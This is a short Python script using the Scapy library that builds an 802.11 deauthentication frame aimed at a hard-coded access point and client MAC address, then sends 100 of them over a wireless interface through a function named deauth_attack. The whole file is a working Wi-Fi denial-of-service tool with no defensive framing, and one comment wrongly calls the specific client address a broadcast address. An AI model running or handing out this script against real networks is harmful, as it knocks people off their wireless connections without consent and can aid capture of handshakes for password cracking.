from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

# Define the network interface to use
interface = "Wi-Fi"

# Target MAC address (BSSID) and client MAC address
target_bssid = "52:3f:fc:ae:f1:f2"
client_mac = "c6:2f:4d:e1:88:09"  # Broadcast address to target all clients

# Construct the deauthentication frame
dot11 = Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid)
frame = RadioTap() / dot11 / Dot11Deauth(reason=7)

# Function to send deauthentication packets
def deauth_attack(interface, frame):
    print(f"Sending deauth packets on {interface} to {target_bssid}")
    sendp(frame, iface=interface, count=100, inter=0.1)

# Execute the attack
deauth_attack(interface, frame)
